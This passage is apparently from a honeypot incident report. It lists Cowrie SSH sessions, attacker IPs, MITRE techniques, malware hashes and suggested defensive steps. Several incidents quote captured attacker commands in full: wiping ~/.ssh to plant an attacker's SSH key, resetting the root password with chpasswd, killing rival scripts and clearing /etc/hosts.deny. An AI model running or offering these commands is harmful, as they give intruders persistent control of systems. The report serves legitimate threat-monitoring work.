|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:16 |
| **Last Seen** | 2026-05-03 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:16:28` | `cowrie.session.connect` |
| `2026-05-03 20:16:28` | `cowrie.client.version` |
| `2026-05-03 20:16:28` | `cowrie.client.kex` |
| `2026-05-03 20:16:28` | `cowrie.login.success` |
| `2026-05-03 20:16:29` | `cowrie.session.params` |
| `2026-05-03 20:16:29` | `cowrie.command.input` |
| `2026-05-03 20:16:29` | `cowrie.command.failed` |
| `2026-05-03 20:16:29` | `cowrie.log.closed` |
| `2026-05-03 20:16:29` | `cowrie.session.params` |
| `2026-05-03 20:16:29` | `cowrie.command.input` |
| `2026-05-03 20:16:29` | `cowrie.session.file_download` |
| `2026-05-03 20:16:29` | `cowrie.log.closed` |
| `2026-05-03 20:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96093bccd19f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:16 |
| **Last Seen** | 2026-05-03 20:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:16:30` | `cowrie.session.connect` |
| `2026-05-03 20:16:30` | `cowrie.client.version` |
| `2026-05-03 20:16:30` | `cowrie.client.kex` |
| `2026-05-03 20:16:31` | `cowrie.login.success` |
| `2026-05-03 20:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de7fc26f8a39

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:17 |
| **Last Seen** | 2026-05-03 20:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:17:27` | `cowrie.session.connect` |
| `2026-05-03 20:17:27` | `cowrie.client.version` |
| `2026-05-03 20:17:27` | `cowrie.client.kex` |
| `2026-05-03 20:17:28` | `cowrie.login.success` |
| `2026-05-03 20:17:28` | `cowrie.session.params` |
| `2026-05-03 20:17:28` | `cowrie.command.input` |
| `2026-05-03 20:17:28` | `cowrie.command.failed` |
| `2026-05-03 20:17:28` | `cowrie.log.closed` |
| `2026-05-03 20:17:28` | `cowrie.session.params` |
| `2026-05-03 20:17:28` | `cowrie.command.input` |
| `2026-05-03 20:17:28` | `cowrie.session.file_download` |
| `2026-05-03 20:17:28` | `cowrie.log.closed` |
| `2026-05-03 20:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99754d519e8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:17 |
| **Last Seen** | 2026-05-03 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:17:30` | `cowrie.session.connect` |
| `2026-05-03 20:17:30` | `cowrie.client.version` |
| `2026-05-03 20:17:30` | `cowrie.client.kex` |
| `2026-05-03 20:17:30` | `cowrie.login.success` |
| `2026-05-03 20:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c08919adb62

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-05-03 20:35 |
| **Last Seen** | 2026-05-03 20:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:35:41` | `cowrie.session.connect` |
| `2026-05-03 20:35:41` | `cowrie.client.version` |
| `2026-05-03 20:35:41` | `cowrie.client.kex` |
| `2026-05-03 20:35:41` | `cowrie.login.success` |
| `2026-05-03 20:35:42` | `cowrie.session.params` |
| `2026-05-03 20:35:42` | `cowrie.command.input` |
| `2026-05-03 20:35:42` | `cowrie.command.failed` |
| `2026-05-03 20:35:42` | `cowrie.log.closed` |
| `2026-05-03 20:35:42` | `cowrie.session.params` |
| `2026-05-03 20:35:42` | `cowrie.command.input` |
| `2026-05-03 20:35:42` | `cowrie.session.file_download` |
| `2026-05-03 20:35:42` | `cowrie.log.closed` |
| `2026-05-03 20:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7a27c56534e

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-05-03 20:35 |
| **Last Seen** | 2026-05-03 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:35:45` | `cowrie.session.connect` |
| `2026-05-03 20:35:45` | `cowrie.client.version` |
| `2026-05-03 20:35:45` | `cowrie.client.kex` |
| `2026-05-03 20:35:45` | `cowrie.login.success` |
| `2026-05-03 20:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69efd2f9a31d

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-05-03 20:37 |
| **Last Seen** | 2026-05-03 20:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:37:12` | `cowrie.session.connect` |
| `2026-05-03 20:37:12` | `cowrie.client.version` |
| `2026-05-03 20:37:12` | `cowrie.client.kex` |
| `2026-05-03 20:37:13` | `cowrie.login.success` |
| `2026-05-03 20:37:13` | `cowrie.session.params` |
| `2026-05-03 20:37:13` | `cowrie.command.input` |
| `2026-05-03 20:37:13` | `cowrie.command.failed` |
| `2026-05-03 20:37:13` | `cowrie.log.closed` |
| `2026-05-03 20:37:14` | `cowrie.session.params` |
| `2026-05-03 20:37:14` | `cowrie.command.input` |
| `2026-05-03 20:37:14` | `cowrie.session.file_download` |
| `2026-05-03 20:37:14` | `cowrie.log.closed` |
| `2026-05-03 20:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f4337bfc76

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-05-03 20:37 |
| **Last Seen** | 2026-05-03 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:37:16` | `cowrie.session.connect` |
| `2026-05-03 20:37:16` | `cowrie.client.version` |
| `2026-05-03 20:37:16` | `cowrie.client.kex` |
| `2026-05-03 20:37:17` | `cowrie.login.success` |
| `2026-05-03 20:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269db2fa7b6e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]106` |
| **First Seen** | 2026-05-03 20:49 |
| **Last Seen** | 2026-05-03 20:50 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ctt7b3i7ASmz"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:49:42` | `cowrie.session.connect` |
| `2026-05-03 20:49:42` | `cowrie.client.version` |
| `2026-05-03 20:49:42` | `cowrie.client.kex` |
| `2026-05-03 20:49:43` | `cowrie.login.success` |
| `2026-05-03 20:49:43` | `cowrie.session.params` |
| `2026-05-03 20:49:43` | `cowrie.command.input` |
| `2026-05-03 20:49:43` | `cowrie.command.failed` |
| `2026-05-03 20:49:43` | `cowrie.log.closed` |
| `2026-05-03 20:49:43` | `cowrie.session.params` |
| `2026-05-03 20:49:43` | `cowrie.command.input` |
| `2026-05-03 20:49:44` | `cowrie.session.file_download` |
| `2026-05-03 20:49:44` | `cowrie.log.closed` |
| `2026-05-03 20:49:54` | `cowrie.session.params` |
| `2026-05-03 20:49:54` | `cowrie.command.input` |
| `2026-05-03 20:49:54` | `cowrie.log.closed` |
| `2026-05-03 20:49:55` | `cowrie.session.params` |
| `2026-05-03 20:49:55` | `cowrie.command.input` |
| `2026-05-03 20:49:55` | `cowrie.log.closed` |
| `2026-05-03 20:49:55` | `cowrie.session.params` |
| `2026-05-03 20:49:55` | `cowrie.command.input` |
| `2026-05-03 20:49:55` | `cowrie.session.file_download` |
| `2026-05-03 20:49:55` | `cowrie.log.closed` |
| `2026-05-03 20:49:55` | `cowrie.session.params` |
| `2026-05-03 20:49:55` | `cowrie.command.input` |
| `2026-05-03 20:49:56` | `cowrie.log.closed` |
| `2026-05-03 20:49:56` | `cowrie.session.params` |
| `2026-05-03 20:49:56` | `cowrie.command.input` |
| `2026-05-03 20:49:56` | `cowrie.log.closed` |
| `2026-05-03 20:49:56` | `cowrie.session.params` |
| `2026-05-03 20:49:56` | `cowrie.command.input` |
| `2026-05-03 20:49:56` | `cowrie.command.input` |
| `2026-05-03 20:49:56` | `cowrie.log.closed` |
| `2026-05-03 20:49:57` | `cowrie.session.params` |
| `2026-05-03 20:49:57` | `cowrie.command.input` |
| `2026-05-03 20:49:57` | `cowrie.log.closed` |
| `2026-05-03 20:49:58` | `cowrie.session.params` |
| `2026-05-03 20:49:58` | `cowrie.command.input` |
| `2026-05-03 20:49:58` | `cowrie.log.closed` |
| `2026-05-03 20:49:58` | `cowrie.session.params` |
| `2026-05-03 20:49:58` | `cowrie.command.input` |
| `2026-05-03 20:49:58` | `cowrie.log.closed` |
| `2026-05-03 20:49:59` | `cowrie.session.params` |
| `2026-05-03 20:49:59` | `cowrie.command.input` |
| `2026-05-03 20:49:59` | `cowrie.log.closed` |
| `2026-05-03 20:49:59` | `cowrie.session.params` |
| `2026-05-03 20:49:59` | `cowrie.command.input` |
| `2026-05-03 20:49:59` | `cowrie.log.closed` |
| `2026-05-03 20:50:00` | `cowrie.session.params` |
| `2026-05-03 20:50:00` | `cowrie.command.input` |
| `2026-05-03 20:50:00` | `cowrie.log.closed` |
| `2026-05-03 20:50:00` | `cowrie.session.params` |
| `2026-05-03 20:50:00` | `cowrie.command.input` |
| `2026-05-03 20:50:01` | `cowrie.log.closed` |
| `2026-05-03 20:50:01` | `cowrie.session.params` |
| `2026-05-03 20:50:01` | `cowrie.command.input` |
| `2026-05-03 20:50:01` | `cowrie.log.closed` |
| `2026-05-03 20:50:01` | `cowrie.session.params` |
| `2026-05-03 20:50:01` | `cowrie.command.input` |
| `2026-05-03 20:50:01` | `cowrie.log.closed` |
| `2026-05-03 20:50:02` | `cowrie.session.params` |
| `2026-05-03 20:50:02` | `cowrie.command.input` |
| `2026-05-03 20:50:02` | `cowrie.log.closed` |
| `2026-05-03 20:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]106` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `161.97.179[.]152` | **39** | 2026-05-03 19:12 | 2026-05-03 20:21 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `122.168.194[.]41` | **30** | 2026-05-03 19:15 | 2026-05-03 19:45 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.205[.]128` | **30** | 2026-05-03 19:20 | 2026-05-03 20:17 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.78.29[.]97` | **30** | 2026-05-03 19:45 | 2026-05-03 20:44 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `79.55.224[.]44` | **30** | 2026-05-03 19:13 | 2026-05-03 20:04 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `5.182.83[.]231` | **12** | 2026-05-03 19:16 | 2026-05-03 20:33 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.107[.]221` | **3** | 2026-05-03 19:41 | 2026-05-03 20:06 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]106` | **2** | 2026-05-03 20:49 | 2026-05-03 20:49 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.141[.]163` | 1 | 2026-05-03 19:28 | 2026-05-03 19:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.154[.]252` | 1 | 2026-05-03 19:16 | 2026-05-03 19:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.81[.]144` | 1 | 2026-05-03 19:50 | 2026-05-03 19:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.191.165[.]66` | 1 | 2026-05-03 20:46 | 2026-05-03 20:47 | 13s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]224` | 1 | 2026-05-03 19:10 | 2026-05-03 19:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.236.76[.]72` | 1 | 2026-05-03 19:44 | 2026-05-03 19:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.135[.]217` | 1 | 2026-05-03 20:15 | 2026-05-03 20:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `159.203.35[.]6` | 1 | 2026-05-03 20:44 | 2026-05-03 20:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.141[.]1` | 1 | 2026-05-03 20:01 | 2026-05-03 20:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.216[.]153` | 1 | 2026-05-03 19:42 | 2026-05-03 19:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]178` | 1 | 2026-05-03 20:19 | 2026-05-03 20:19 | 1s | 0 | `T1592` | 🟢 LOW |
| `42.96.17[.]249` | 1 | 2026-05-03 20:45 | 2026-05-03 20:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.243.51[.]171` | 1 | 2026-05-03 19:18 | 2026-05-03 19:18 | 30s | 0 | `T1592` | 🟢 LOW |
| `64.227.109[.]89` | 1 | 2026-05-03 20:15 | 2026-05-03 20:15 | 2s | 0 | `T1592` | 🟢 LOW |
| `8.154.0[.]104` | 1 | 2026-05-03 20:05 | 2026-05-03 20:07 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `185.247.137[.]178` | GB | Driftnet Ltd | **100** ⚠️ | 39 |
| `42.96.17[.]249` | VN | Long Van System Solution JSC | **100** ⚠️ | 3 |
| `152.32.135[.]217` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `165.154.205[.]128` | SG | Scloud Pte Ltd t/a Scloud Pte Ltd | **100** ⚠️ | 50 |
| `14.103.107[.]221` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `79.55.224[.]44` | IT | Telecom Italia S.p.A. | **100** ⚠️ | 8 |
